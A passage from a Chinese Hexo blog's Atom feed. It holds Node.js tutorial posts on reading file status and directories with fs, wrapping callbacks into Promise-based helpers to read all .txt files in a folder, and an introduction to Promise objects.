class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(curr.mtime.getHours() + &lt;span class=&quot;string&quot;&gt;&#39;:&#39;&lt;/span&gt; + curr.mtime.getMinutes() + &lt;span class=&quot;string&quot;&gt;&#39;:&#39;&lt;/span&gt; +curr.mtime.getSeconds());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(prev.mtime.getHours() + &lt;span class=&quot;string&quot;&gt;&#39;:&#39;&lt;/span&gt; + prev.mtime.getMinutes() + &lt;span class=&quot;string&quot;&gt;&#39;:&#39;&lt;/span&gt; +prev.mtime.getSeconds());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用模板引擎时需要注意的地方&lt;/p&gt;
    
    </summary>
    
      <category term="Node.js" scheme="http://yoursite.com/categories/Node-js/"/>
    
    
      <category term="Node.js" scheme="http://yoursite.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>Node-文件操作（中）- 文件状态、promise版本封装</title>
    <link href="http://yoursite.com/2016/12/08/Node-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%88%E4%B8%AD%EF%BC%89-%20%E6%96%87%E4%BB%B6%E7%8A%B6%E6%80%81%E3%80%81promise%E7%89%88%E6%9C%AC%E5%B0%81%E8%A3%85/"/>
    <id>http://yoursite.com/2016/12/08/Node-文件操作（中）- 文件状态、promise版本封装/</id>
    <published>2016-12-07T16:00:00.000Z</published>
    <updated>2018-06-06T03:03:52.788Z</updated>
    
    <content type="html"><![CDATA[<h2 id="获取文件信息"><a href="#获取文件信息" class="headerlink" title="获取文件信息"></a>获取文件信息</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">fs.stat(path,callback);</span><br></pre></td></tr></table></figure><h2 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h2><p>readdir 只能读取一级目录</p><a id="more"></a><h3 id="1-readdir-方法初步使用"><a href="#1-readdir-方法初步使用" class="headerlink" title="1. readdir 方法初步使用"></a>1. readdir 方法初步使用</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line">fs.readdir(rootDir, (err, data) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> name <span class="keyword">of</span> files) &#123;</span><br><span class="line">    <span class="keyword">const</span> tmpPath = path.join(rootDir, name);</span><br><span class="line">    fs.stat(tmpPath, (err, stats) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (stats.isFile() &amp;&amp; path.extname(tmpPath) === <span class="string">'.cmd'</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(tempPath);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="2-把-1-的代码封装成一个方法，得到一个目录下所有后缀名的文件"><a href="#2-把-1-的代码封装成一个方法，得到一个目录下所有后缀名的文件" class="headerlink" title="2. 把 1 的代码封装成一个方法，得到一个目录下所有后缀名的文件"></a>2. 把 1 的代码封装成一个方法，得到一个目录下所有后缀名的文件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> rootDir = <span class="string">'./data'</span>;</span><br><span class="line">getPathsByFilter(rootDir, <span class="string">'.txt'</span>, (err, paths) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(paths);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 封装成一个方法，得到一个目录下所有后缀名的文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPathsByFilter</span>(<span class="params">rootDir, extName, callback</span>) </span>&#123;</span><br><span class="line">  fs.readdir(rootDir, (err, files) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> callback(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> paths = [];</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> name <span class="keyword">of</span> files) &#123;</span><br><span class="line">      <span class="keyword">const</span> tmpPath = path.join(rootDir, name);</span><br><span class="line">      fs.stat(tmpPath, (err, stats) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">return</span> callback(err);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stats.isFile() &amp;&amp; path.extname(tmpPath) === extName) &#123;</span><br><span class="line">          paths.push(tmpPath);</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">if</span> (count === files.length) &#123;</span><br><span class="line">          callback(<span class="literal">null</span>, paths);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-把-2-代码块得到的所有文件都读出来"><a href="#3-把-2-代码块得到的所有文件都读出来" class="headerlink" title="3. 把 2 代码块得到的所有文件都读出来"></a>3. 把 2 代码块得到的所有文件都读出来</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> rootDir = <span class="string">'./data'</span>;</span><br><span class="line">getPathsByFilter(rootDir, <span class="string">'.txt'</span>, (err, paths) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 读文件</span></span><br><span class="line">  <span class="built_in">Promise</span>.all(paths.map(<span class="function"><span class="params">p</span> =&gt;</span> readFile(p)))</span><br><span class="line">  .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    data.forEach(<span class="function"><span class="params">d</span> =&gt;</span> <span class="built_in">console</span>.log(d.toString()));</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 封装成一个方法，得到一个目录下所有后缀名的文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPathsByFilter</span>(<span class="params">rootDir, extName, callback</span>) </span>&#123;</span><br><span class="line">  fs.readdir(rootDir, (err, files) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> callback(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> paths = [];</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> name <span class="keyword">of</span> files) &#123;</span><br><span class="line">      <span class="keyword">const</span> tmpPath = path.join(rootDir, name);</span><br><span class="line">      fs.stat(tmpPath, (err, stats) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">return</span> callback(err);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stats.isFile() &amp;&amp; path.extname(tmpPath) === extName) &#123;</span><br><span class="line">          paths.push(tmpPath);</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">if</span> (count === files.length) &#123;</span><br><span class="line">          callback(<span class="literal">null</span>, paths);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读文件的方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readFile</span>(<span class="params">filePath</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(filePath, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(err);</span><br><span class="line">      &#125;</span><br><span class="line">      resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样封装的 getPathsByFilter() 方法不是好的 API，要用 Promise， 都封装成 Promise 版本</p><h3 id="4-把-3-代码优化"><a href="#4-把-3-代码优化" class="headerlink" title="4. 把 3 代码优化"></a>4. 把 3 代码优化</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> rootDir = <span class="string">'./data'</span>;</span><br><span class="line">getPathsByFilter(rootDir, <span class="string">'.txt'</span>)</span><br><span class="line">.then(<span class="function"><span class="params">paths</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.all(paths.map(<span class="function"><span class="params">p</span> =&gt;</span> readFile(p)))</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  data.forEach(<span class="function"><span class="params">d</span> =&gt;</span> <span class="built_in">console</span>.log(d.toString()));</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> err;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 封装成一个方法，得到一个目录下所有后缀名的文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPathsByFilter</span>(<span class="params">rootDir, extName</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readdir(rootDir, (err, files) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(err);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> paths = [];</span><br><span class="line">      <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> name <span class="keyword">of</span> files) &#123;</span><br><span class="line">        <span class="keyword">const</span> tmpPath = path.join(rootDir, name);</span><br><span class="line">        fs.stat(tmpPath, (err, stats) =&gt; &#123;</span><br><span class="line">          <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> reject(err);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (stats.isFile() &amp;&amp; path.extname(tmpPath) === extName) &#123;</span><br><span class="line">            paths.push(tmpPath);</span><br><span class="line">          &#125;</span><br><span class="line">          count++;</span><br><span class="line">          <span class="keyword">if</span> (count === files.length) &#123;</span><br><span class="line">            resolve(paths);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读文件的方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readFile</span>(<span class="params">filePath</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(filePath, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(err);</span><br><span class="line">      &#125;</span><br><span class="line">      resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-终极-promise-版本的指定文件目录，读取指定后缀名的所有文件"><a href="#5-终极-promise-版本的指定文件目录，读取指定后缀名的所有文件" class="headerlink" title="5. 终极 promise 版本的指定文件目录，读取指定后缀名的所有文件"></a>5. 终极 promise 版本的指定文件目录，读取指定后缀名的所有文件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> rootDir = <span class="string">'./data'</span>;</span><br><span class="line">getPathsByFilter(rootDir, <span class="string">'.txt'</span>)</span><br><span class="line">  .then(<span class="function"><span class="params">paths</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.all(paths.map(<span class="function"><span class="params">p</span> =&gt;</span> readFile(p)))</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    data.forEach(<span class="function"><span class="params">d</span> =&gt;</span> <span class="built_in">console</span>.log(d.toString()))</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> err</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPathsByFilter</span>(<span class="params">rootDir, extName</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    readdir(rootDir).then(<span class="function"><span class="params">files</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> paths = []</span><br><span class="line">        <span class="keyword">let</span> count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> name <span class="keyword">of</span> files) &#123;</span><br><span class="line">          <span class="keyword">const</span> tmpPath = path.join(rootDir, name)</span><br><span class="line">          stat(tmpPath).then(<span class="function"><span class="params">stats</span> =&gt;</span> &#123;</span><br><span class="line">              <span class="comment">// 判断是否是文件并且后缀名是指定的 .txt</span></span><br><span class="line">              <span class="keyword">if</span> (stats.isFile() &amp;&amp; path.extname(tmpPath) === extName) &#123;</span><br><span class="line">                paths.push(tmpPath)</span><br><span class="line">              &#125;</span><br><span class="line">              count++</span><br><span class="line">              <span class="keyword">if</span> (count === files.length) &#123;</span><br><span class="line">                resolve(paths)</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">              <span class="comment">// 主动在当前代码块抛出异常</span></span><br><span class="line">              <span class="built_in">Promise</span>.reject(err)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        reject(err)</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件目录操作</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readdir</span>(<span class="params">dir</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readdir(dir, (err, files) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(err)</span><br><span class="line">      &#125;</span><br><span class="line">      resolve(files)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读文件的方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readFile</span>(<span class="params">filePath</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(filePath, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(err)</span><br><span class="line">      &#125;</span><br><span class="line">      resolve(data)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取文件状态</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stat</span>(<span class="params">filePath</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.stat(filePath, (err, stats) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(err)</span><br><span class="line">      &#125;</span><br><span class="line">      resolve(stats)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;获取文件信息&quot;&gt;&lt;a href=&quot;#获取文件信息&quot; class=&quot;headerlink&quot; title=&quot;获取文件信息&quot;&gt;&lt;/a&gt;获取文件信息&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; fs = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;fs&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fs.stat(path,callback);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;文件目录&quot;&gt;&lt;a href=&quot;#文件目录&quot; class=&quot;headerlink&quot; title=&quot;文件目录&quot;&gt;&lt;/a&gt;文件目录&lt;/h2&gt;&lt;p&gt;readdir 只能读取一级目录&lt;/p&gt;
    
    </summary>
    
      <category term="Node.js" scheme="http://yoursite.com/categories/Node-js/"/>
    
    
      <category term="Node.js" scheme="http://yoursite.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>Node-promise对象</title>
    <link href="http://yoursite.com/2016/11/22/Node-promise%E5%AF%B9%E8%B1%A1/"/>
    <id>http://yoursite.com/2016/11/22/Node-promise对象/</id>
    <published>2016-11-21T16:00:00.000Z</published>
    <updated>2018-06-06T02:58:43.345Z</updated>
    
    <content type="html"><![CDATA[<p>一个 promise 在在代码中体现出来就是一个对象，该对象一般保存一个异步执行的任务。</p><p>Promise是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。它由社区最早提出和实现，ES6将其写进了语言标准，统一了用法，原生提供了 <code>Promise</code> 对象。表示是一个未来的事情，可能做到，也可能失败。 Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。</p><h2 id="Promise-对象"><a href="#Promise-对象" class="headerlink" title="Promise 对象"></a>Promise 对象</h2><p>从语法上说，Promise是一个对象，从它可以获取异步操作的结果。</p><a id="more"></a><p>Promise对象代表一个异步操作，有三种状态：</p><ul><li>Pending（进行中）</li><li>Resolved（已完成，又称Fulfilled）</li><li>Rejected（已失败）</li></ul><p>只有异步操作的结果，可以决定当前是哪一种状态。</p><p>有了Promise对象，就可以将异步操作以同步操作的流程表达出来，避免了层层嵌套的回调函数。此外，Promise对象提供统一的接口，使得控制异步操作更加容易。</p><blockquote><p>一个读文件的例子:</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="comment">// Promise 对象容器中一般放置一个异步执行的任务</span></span><br><span class="line"><span class="comment">// 就是封装一个异步执行的 API</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Promise 容器执行了'</span>);</span><br><span class="line">  fs.readFile(<span class="string">'./es6.md'</span>, <span class="string">'utf8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="comment">// 容器中异步任务失败之后，就调用容器的 Promise 对象的 reject 方法；</span></span><br><span class="line">      <span class="comment">// 将错误对象传递给 regect 方法</span></span><br><span class="line">      <span class="keyword">return</span> reject(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 容器中异步任务成功之后，就调用 Promise 容器中的 resolve 方法，</span></span><br><span class="line">    <span class="comment">// 将结果传递给 resolve 方法</span></span><br><span class="line">    resolve(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 当 Promise 对象一经创建就会立即执行</span></span><br><span class="line"><span class="comment">// 可以通过 Promise 容器对象的任何方法接收 容器中 resolve 传递的结果值</span></span><br><span class="line"><span class="comment">// then 方法需要接收一个回调函数，该回调函数是 Promise 容器中的 resolve</span></span><br><span class="line">p.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;, err =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'读取文件失败了'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 